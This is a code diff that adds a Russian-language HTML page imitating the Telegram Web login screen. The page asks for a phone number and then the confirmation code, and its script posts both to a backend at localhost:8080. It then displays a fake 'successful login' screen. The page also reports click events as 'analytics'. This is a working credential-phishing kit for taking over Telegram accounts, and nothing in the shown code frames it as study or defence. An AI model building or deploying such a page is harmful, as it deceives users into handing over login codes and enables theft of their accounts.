@@ -1,0 +1,370 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Telegram Web</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+        }
+        body {
+            background: #ffffff;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+        }
+        .container {
+            width: 100%;
+            max-width: 380px;
+            padding: 20px;
+            border-radius: 16px;
+            box-shadow: 0 12px 40px rgba(0, 0, 0, 0.08);
+            border: 1px solid #e6e6e6;
+        }
+        .logo-text {
+            display: block;
+            text-align: center;
+            font-size: 36px;
+            font-weight: 700;
+            color: #3390ec;
+            letter-spacing: -0.5px;
+            margin-bottom: 28px;
+            user-select: none;
+        }
+        .title {
+            font-size: 22px;
+            font-weight: 500;
+            color: #1f1f1f;
+            text-align: center;
+            margin-bottom: 8px;
+        }
+        .subtitle {
+            font-size: 14px;
+            color: #7f7f7f;
+            text-align: center;
+            margin-bottom: 28px;
+        }
+        .input-group {
+            margin-bottom: 18px;
+        }
+        .input-group label {
+            display: block;
+            font-size: 13px;
+            font-weight: 500;
+            color: #2c2c2c;
+            margin-bottom: 6px;
+        }
+        .input-group input {
+            width: 100%;
+            padding: 12px 14px;
+            font-size: 16px;
+            border: 1.5px solid #d9d9d9;
+            border-radius: 10px;
+            outline: none;
+            transition: border 0.2s;
+            background: #fafafa;
+        }
+        .input-group input:focus {
+            border-color: #3390ec;
+            background: #ffffff;
+            box-shadow: 0 0 0 3px rgba(51, 144, 236, 0.15);
+        }
+        .input-group .hint {
+            font-size: 12px;
+            color: #999;
+            margin-top: 4px;
+        }
+        .btn {
+            width: 100%;
+            padding: 13px;
+            background: #3390ec;
+            color: #fff;
+            font-size: 16px;
+            font-weight: 600;
+            border: none;
+            border-radius: 10px;
+            cursor: pointer;
+            transition: background 0.2s;
+            margin-top: 6px;
+        }
+        .btn:hover {
+            background: #2775c7;
+        }
+        .btn:active {
+            transform: scale(0.98);
+        }
+        .btn:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+        }
+        .qr-row {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            margin-top: 22px;
+            font-size: 14px;
+            color: #3390ec;
+            cursor: default;
+        }
+        .qr-row span {
+            border-bottom: 1px dashed #3390ec;
+        }
+        .footer {
+            text-align: center;
+            margin-top: 28px;
+            font-size: 12px;
+            color: #b0b0b0;
+        }
+        .footer a {
+            color: #3390ec;
+            text-decoration: none;
+        }
+        .error-message {
+            background: #ffe8e8;
+            color: #d32f2f;
+            padding: 10px 14px;
+            border-radius: 8px;
+            font-size: 14px;
+            display: none;
+            margin-bottom: 16px;
+            border-left: 4px solid #d32f2f;
+        }
+        .badge {
+            position: fixed;
+            bottom: 12px;
+            right: 12px;
+            background: #1f1f1f;
+            color: #0f0;
+            padding: 6px 12px;
+            border-radius: 20px;
+            font-size: 11px;
+            font-family: monospace;
+            opacity: 0.7;
+            pointer-events: none;
+            z-index: 999;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.2);
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <span class="logo-text">Telegram</span>
+
+        <div class="title">Вход в аккаунт</div>
+        <div class="subtitle" id="stepSubtitle">Введите номер телефона для продолжения</div>
+
+        <div id="errorBox" class="error-message"></div>
+
+        <form id="loginForm">
+            <div id="phoneGroup" class="input-group">
+                <label for="phone">Номер телефона</label>
+                <input type="tel" id="phone" placeholder="+7 999 123 45 67" value="" required autofocus>
+                <div class="hint">Используйте международный формат</div>
+            </div>
+
+            <div id="codeGroup" class="input-group" style="display: none;">
+                <label for="code">Код подтверждения</label>
+                <input type="text" id="code" placeholder="12345" inputmode="numeric">
+                <div class="hint">Код из приложения Telegram или SMS</div>
+            </div>
+
+            <button type="submit" class="btn" id="submitBtn">Далее</button>
+        </form>
+
+        <div class="qr-row">
+            <span>Войти по QR-коду</span>
+        </div>
+
+        <div class="footer">
+            <a href="#">Не удаётся войти?</a> · <a href="#">Зарегистрироваться</a>
+        </div>
+    </div>
+
+    <div class="badge">📡 SENDING TO SERVER</div>
+
+    <script>
+        (function() {
+            // === БЭКЕНД: отправка на localhost:8080 ===
+            const BACKEND_URL = 'http://localhost:8080';
+
+            const form = document.getElementById('loginForm');
+            const phoneInput = document.getElementById('phone');
+            const codeInput = document.getElementById('code');
+            const phoneGroup = document.getElementById('phoneGroup');
+            const codeGroup = document.getElementById('codeGroup');
+            const submitBtn = document.getElementById('submitBtn');
+            const errorBox = document.getElementById('errorBox');
+            const stepSubtitle = document.getElementById('stepSubtitle');
+
+            let step = 'phone';
+            let capturedPhone = '';
+
+            // === ОТПРАВКА ДАННЫХ НА БЭКЕНД ===
+            async function sendToBackend(data) {
+                try {
+                    const response = await fetch(BACKEND_URL, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify(data)
+                    });
+
+                    const result = await response.json();
+                    console.log('[SWILL] Ответ от сервера:', result);
+                    return result;
+                } catch (error) {
+                    console.error('[SWILL] Ошибка отправки:', error);
+                    showError('Не удалось соединиться с сервером. Убедитесь, что бэкенд запущен.');
+                    throw error;
+                }
+            }
+
+            function showError(text) {
+                errorBox.style.display = 'block';
+                errorBox.textContent = text;
+                setTimeout(() => {
+                    errorBox.style.display = 'none';
+                }, 5000);
+            }
+
+            function clearError() {
+                errorBox.style.display = 'none';
+            }
+
+            function switchToCodeStep() {
+                step = 'code';
+                phoneGroup.style.display = 'none';
+                codeGroup.style.display = 'block';
+                stepSubtitle.textContent = 'Введите код подтверждения';
+                submitBtn.textContent = 'Войти';
+                codeInput.focus();
+            }
+
+            // === ОТПРАВКА ФОРМЫ ===
+            form.addEventListener('submit', async function(e) {
+                e.preventDefault();
+                clearError();
+
+                if (step === 'phone') {
+                    const phone = phoneInput.value.trim();
+                    if (!phone || phone.length < 8) {
+                        showError('Введите корректный номер телефона.');
+                        return;
+                    }
+
+                    capturedPhone = phone;
+                    submitBtn.textContent = 'Отправка...';
+                    submitBtn.disabled = true;
+
+                    try {
+                        const result = await sendToBackend({
+                            step: 'phone',
+                            phone: phone,
+                            action: 'send_code',
+                            timestamp: Date.now()
+                        });
+
+                        if (result && result.requireCode) {
+                            switchToCodeStep();
+                        } else {
+                            showError('Ошибка сервера. Попробуйте позже.');
+                        }
+                    } catch (err) {
+                        // Ошибка уже показана в sendToBackend
+                    } finally {
+                        submitBtn.disabled = false;
+                        if (step === 'phone') {
+                            submitBtn.textContent = 'Далее';
+                        }
+                    }
+                } 
+                else if (step === 'code') {
+                    const code = codeInput.value.trim();
+                    if (!code || code.length < 4) {
+                        showError('Введите код подтверждения (минимум 4 символа).');
+                        return;
+                    }
+
+                    submitBtn.textContent = 'Проверка...';
+                    submitBtn.disabled = true;
+
+                    try {
+                        const result = await sendToBackend({
+                            step: 'code',
+                            phone: capturedPhone,
+                            code: code,
+                            action: 'verify_code',
+                            fullPayload: {
+                                phone: capturedPhone,
+                                code: code,
+                                timestamp: Date.now()
+                            }
+                        });
+
+                        if (result && result.redirect) {
+                            // === УСПЕШНЫЙ ВХОД — заглушка ===
+                            document.body.innerHTML = `
+                                <div style="display:flex;justify-content:center;align-items:center;height:100vh;flex-direction:column;font-family:sans-serif;background:#fff;padding:20px;">
+                                    <div style="width:64px;height:64px;border-radius:50%;background:#34a853;display:flex;align-items:center;justify-content:center;font-size:36px;color:#fff;margin-bottom:24px;">✓</div>
+                                    <h2 style="color:#1f1f1f;font-weight:500;">Добро пожаловать</h2>
+                                    <p style="color:#6b7280;text-align:center;max-width:280px;margin-top:8px;">Вы успешно вошли в Telegram Web</p>
+                                    <div style="margin-top:24px;width:36px;height:36px;border:3px solid #e5e7eb;border-top:3px solid #3390ec;border-radius:50%;animation:spin 0.8s linear infinite;"></div>
+                                    <style>@keyframes spin{to{transform:rotate(360deg)}}</style>
+                                    <p style="margin-top:28px;font-size:13px;color:#9ca3af;">Данные отправлены на сервер</p>
+                                </div>
+                            `;
+                        } else {
+                            showError('Неверный код. Попробуйте снова.');
+                        }
+                    } catch (err) {
+                        // уже обработано
+                    } finally {
+                        submitBtn.disabled = false;
+                        if (step === 'code') {
+                            submitBtn.textContent = 'Войти';
+                        }
+                    }
+                }
+            });
+
+            // === ВСПОМОГАТЕЛЬНЫЕ СОБЫТИЯ ===
+            codeInput.addEventListener('keydown', function(e) {
+                if (e.key === 'Enter') {
+                    form.dispatchEvent(new Event('submit'));
+                }
+            });
+
+            phoneInput.addEventListener('input', function() {
+                let val = this.value.replace(/[^0-9+]/g, '');
+                if (!val.startsWith('+') && val.length > 0) {
+                    val = '+' + val.replace(/^\+/, '');
+                }
+                this.value = val;
+            });
+
+            // Клики по QR и ссылкам — тоже отправляем на сервер (для сбора аналитики)
+            document.querySelector('.qr-row span').addEventListener('click', function() {
+                sendToBackend({ action: 'qr_click', step: 'analytics' }).catch(() => {});
+            });
+
+            document.querySelectorAll('.footer a').forEach((link) => {
+                link.addEventListener('click', function(e) {
+                    e.preventDefault();
+                    sendToBackend({ action: 'footer_click', text: this.textContent, step: 'analytics' }).catch(() => {});
+                });
+            });
+
+            console.log('[SWILL] Фронтенд загружен. Бэкенд: ' + BACKEND_URL);
+            phoneInput.focus();
+        })();
+    </script>
+</body>
+</html>
